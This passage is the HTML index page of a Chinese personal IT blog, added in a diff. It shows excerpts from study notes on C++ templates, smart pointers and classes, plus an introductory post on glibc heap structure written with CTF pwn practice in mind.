@@ -1,0 +1,1399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="我追逐的不是别人，而是我满怀期待的内心">
+<meta property="og:type" content="website">
+<meta property="og:title" content="fanfan&#39;s blog">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="fanfan&#39;s blog">
+<meta property="og:description" content="我追逐的不是别人，而是我满怀期待的内心">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="fan fan">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>fanfan's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fanfan's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">IT博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/22/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/22/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/" class="post-title-link" itemprop="url">现代c++学习笔记(四)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-22 09:43:57" itemprop="dateCreated datePublished" datetime="2023-03-22T09:43:57+08:00">2023-03-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-29 15:40:22" itemprop="dateModified" datetime="2023-03-29T15:40:22+08:00">2023-03-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/22/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/22/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="模板与泛型编程"><a href="#模板与泛型编程" class="headerlink" title="模板与泛型编程"></a>模板与泛型编程</h1><h2 id="模板介绍，类模板与模板实现原理"><a href="#模板介绍，类模板与模板实现原理" class="headerlink" title="模板介绍，类模板与模板实现原理"></a>模板介绍，类模板与模板实现原理</h2><p><strong>1.</strong> <strong>模板的重要性：模板是C++最重要的模块之一，很多人对模板的重视不够，这一章一定要好好学，所有课时都是重点。</strong></p>
+<p><strong>C++的三大模块，面向过程，面向对象，模板与泛型。面向过程就是C语言，面向对象就是类，现在轮到模板与泛型了。</strong></p>
+<p><strong>2.</strong> <strong>模板的介绍：</strong></p>
+<p>(1) 模板能够实现一些其他语法难以实现的功能，但是理解起来会更加困难，容易导致新手摸不着头脑。</p>
+<p>(2) 模板分为类模板和函数模板，函数模板又分为普通函数模板和成员函数模板。</p>
+<p> <strong>3.</strong> <strong>类模板基础：</strong></p>
+<p>类模板的写法与使用十分固定</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line">	<span class="comment">//&#123; 写在类里面</span></span><br><span class="line">	<span class="comment">//	if (count)</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = new T[count]();</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//	else</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = nullptr;</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;//类内定义</span></span><br><span class="line"><span class="comment">//	if (data)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		delete[] data;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T* data;<span class="comment">//在类中复杂情况可以用智能指针，在老版本不支持创建数组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//begin的类外定义</span></span><br><span class="line"><span class="keyword">typename</span> MyArray&lt;T&gt;::iterator MyArray&lt;T&gt;::<span class="built_in">begin</span>() <span class="type">const</span><span class="comment">//::前面的名称一定是类名或者明明空间</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/22/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0-%E4%B8%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/17/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0-%E4%B8%89/" class="post-title-link" itemprop="url">现代c++学习笔记(三)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-17 18:19:37" itemprop="dateCreated datePublished" datetime="2023-03-17T18:19:37+08:00">2023-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-21 16:28:20" itemprop="dateModified" datetime="2023-03-21T16:28:20+08:00">2023-03-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/17/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0-%E4%B8%89/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/17/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0-%E4%B8%89/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h1><h2 id="智能指针概述"><a href="#智能指针概述" class="headerlink" title="智能指针概述"></a>智能指针概述</h2><p> <strong>1.</strong> 为什么要有智能指针：在Part2的第二节课已经讲过，直接使用new和delete运算符极其容易导致内存泄露，而且非常难以避免。于是人们发明了智能指针这种可以自动回收内存的工具。</p>
+<p>  <strong>2.</strong> 智能指针一共就三种：普通的指针可以单独一个指针占用一块内存，也可以多个指针共享一块内存。</p>
+<p>(1) 共享型智能指针：shared_ptr，同一块堆内存可以被多个shared_ptr共享。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="function"><span class="type">int</span>* <span class="title">pi2</span><span class="params">(pi)</span></span>;<span class="comment">//pi2和pi共享一段内存</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 独享型智能指针：unique_ptr，同一块堆内存只能被一个unique_ptr拥有。无法拷贝和制造</p>
+<p>(3) 弱引用智能指针：weak_ptr，也是一种共享型智能指针，可以视为对共享型智能指针的一种补充</p>
+<p> <strong>3.</strong> <strong>（*）智能指针注意事项：</strong></p>
+<p><strong>智能指针和裸指针不要混用，接下来的几节课会反复强调这一点。</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/17/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0-%E4%B8%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">内核学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-14 20:03:53" itemprop="dateCreated datePublished" datetime="2023-03-14T20:03:53+08:00">2023-03-14</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">堆学习(一)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-14 20:03:34" itemprop="dateCreated datePublished" datetime="2023-03-14T20:03:34+08:00">2023-03-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-20 19:38:08" itemprop="dateModified" datetime="2023-03-20T19:38:08+08:00">2023-03-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>前言：栈草草的结束了，只掌握一些简单的rop利用，至于为什么这么早想学习堆，可能跟我的学习理念有关吧，我的学习理念是了解重要的学习框架，先将基础结构的相对简单的内容学会，再同步深入学习更深度的内容。现在相比较学习栈的其他花里胡哨的利用方式，我更想先学习堆的基本内容和简单利用</strong></p>
+<h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
+<p> <strong>堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。</strong></p>
+<p>实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间</p>
+<blockquote>
+<p>对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
+</blockquote>
+<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20120910.png"></p>
+<p>俺以 <strong>glibc 库下的 ptmalloc2 堆管理器</strong>为例学习</p>
+<h2 id="堆的基本结构"><a href="#堆的基本结构" class="headerlink" title="堆的基本结构"></a>堆的基本结构</h2><p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20142218.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/13/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/13/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/" class="post-title-link" itemprop="url">现代c++学习笔记(二)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-13 15:53:28" itemprop="dateCreated datePublished" datetime="2023-03-13T15:53:28+08:00">2023-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-17 16:35:16" itemprop="dateModified" datetime="2023-03-17T16:35:16+08:00">2023-03-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/13/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/13/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类的权限修饰：c++通过 <strong>public、protected、private</strong> 三个关键字来控制成员变量和成员函数的访问权限，它们分别表示公有的、受保护的、私有的，被称为成员访问限定符。所谓访问权限，就是你能不能使用该类中的成员。</p>
